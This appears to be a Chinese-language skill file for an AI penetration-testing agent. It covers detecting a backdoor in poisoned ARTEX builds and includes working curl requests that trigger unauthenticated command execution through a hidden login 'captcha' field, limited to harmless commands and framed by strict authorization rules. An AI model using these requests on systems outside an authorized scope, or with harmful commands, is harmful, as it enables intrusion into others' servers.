---
name: artex-auth-rce
description: 当目标疑似运行 ARTEX（AI 渗透平台，典型 :8787、/api/health 返回 service=artex、登录页用户名固定 ARTEX）时调用。检测并在授权范围内验证其被投毒版本的「登录接口 captcha 字段未授权命令执行后门」，以无害命令取证并上报为严重漏洞。
---

# ARTEX 登录接口投毒后门（未授权 RCE）检测与验证

部分被投毒（供应链污染）的 ARTEX 版本在登录接口植入了后门：`POST /api/auth/login` 的 JSON 里有一个隐藏字段 `captcha`，当其值以 `!` 开头时，后端对「去掉首字符后的内容」执行 `sh -c`，命令输出经响应里的 `captcha` 字段返回——**无需 JWT、无需正确账号密码**。本 skill 在**已授权**前提下发现并验证该后门。

> 说明：官方/未被污染的 ARTEX 登录接口只接受 `username`/`password` 并做 bcrypt 校验，不存在该字段。命中说明目标跑的是被投毒的版本——这正是要上报的严重供应链/后门漏洞。

---

## 边界与授权（Agent 必读 · 违反即越界）

| 允许 | 禁止 |
|---|---|
| 仅对**本次授权范围内**、确属客户资产的 ARTEX 实例检测 | 对范围外 / 公网任意 ARTEX 实例扫描利用（这是定向攻击他人系统） |
| 用**无害只读命令**（`id`/`whoami`/`hostname`/`uname -a`）证明 RCE 存在 | 执行任何破坏性命令（删文件、改配置、关服务、加账户、持久化、勒索） |
| 读取版本/主机名等最小信息以取证 | 读取/外传目标敏感数据、凭据、数据库内容 |
| 发现即**上报**，交由客户修复 | 以该后门为跳板做横向、提权、装载荷等后渗透（除非另有明确书面授权） |

> ⚠️ 这是**未授权 RCE**,一条请求即可执行命令,破坏力极大。**默认只做"证明存在"**:发一条无害命令、确认回显、立即 `report_finding`。任何超出 PoC 的动作都需显式书面授权,且仍受平台 guard 的"拒绝破坏性操作"约束。无授权范围外的目标**一律不测**。

---

## 1. 先确认目标确实是 ARTEX

避免对无关系统乱打。任一特征即可判定：

```bash
# 健康接口（无需认证）——官方实例返回 service=artex
curl -s -m 8 http://<TARGET>:8787/api/health
# 预期: {"ok":true,"service":"artex","version":"..."}
```

其它特征：登录页用户名输入框固定为 `ARTEX`；favicon/标题含 ARTEX；默认端口 `8787`（反代后可能是 80/443）。确认是 ARTEX 后再进入下一步。

---

## 2. 检测后门是否存在（一条无害探针）

发送带 `captcha` 的登录请求，命令用**唯一随机串 + id**，便于确定性判定（避免误报）：

```bash
NONCE="artexpoc_$(date +%s)_$RANDOM"
curl -s -m 10 -X POST http://<TARGET>:8787/api/auth/login \
  -H 'Content-Type: application/json' \
  -d "{\"username\":\"x\",\"password\":\"y\",\"captcha\":\"!echo $NONCE; id\"}"
```

判定：
- **存在后门（严重）**：响应 JSON 的 `captcha` 字段里回显出了你的 `$NONCE` 和 `id` 的输出（如 `uid=0(root) ...`）。这证明未授权任意命令执行。
- **不存在/已修复**：返回 `401 用户名或密码错误` 之类,`captcha` 不回显命令输出——官方未污染版本即如此,记为"未发现该后门"。

> 只用 `echo <nonce>; id` 这类无副作用命令确认。确认到回显即**停手取证**,不要再发第二条有副作用的命令。

---

## 3. 最小化取证（仅为上报，无副作用）

确认存在后，可再取极少量只读信息辅助定级（可选，仍为无害命令）：

```bash
# 身份与主机（判断是否 root、落在哪台机器）
curl -s -X POST http://<TARGET>:8787/api/auth/login -H 'Content-Type: application/json' \
  -d '{"username":"x","password":"y","captcha":"!id; hostname; uname -a"}'
```

保留：完整的请求体与响应体(含回显)、目标 URL、时间。**不要**去读 `/etc/shadow`、数据库、密钥等敏感内容——证明"能执行命令"已足够定为严重,读敏感数据属越界。

---

## 4. 上报

确认后立即 `report_finding`：

- **severity**：`critical`
- **vulnclass/name**：未授权远程命令执行 / 供应链后门（ARTEX 登录接口 `captcha` 字段 `sh -c` 注入）
- **evidence**：PoC 请求（`captcha` 以 `!` 开头）+ 响应中回显的命令输出（含你的 nonce 与 `id` 结果），证明无需认证即可 RCE。
- 若流量捕获开启,配合 `traffic_search`/`bind_finding_traffic` 绑定这条登录请求/响应作为流量证据。
- `insert_assets` 记下该 ARTEX 服务（host:port、service_type=http、title/version）。

**修复建议**（写进报告给客户）：
- 立即下线或隔离该实例;它运行的是被投毒的 ARTEX 版本,任何人可未授权 RCE。
- 从可信源(官方未污染代码)重新部署;删除登录接口里对 `captcha` 的 `sh -c` 分支。
- 轮换该主机上的一切凭据/密钥(JWT 签名密钥、数据库口令、LLM/第三方 token),并排查是否已被利用(审计登录接口访问日志中 `captcha` 以 `!` 开头的请求)。

---

## 边界重申

本 skill 的产出是**一个已验证的严重漏洞发现 + 修复建议**,不是对目标造成实际损害。证明 RCE 用无害命令即可;破坏性利用、后渗透、数据读取/外传、跨越授权范围,都在禁止之列。
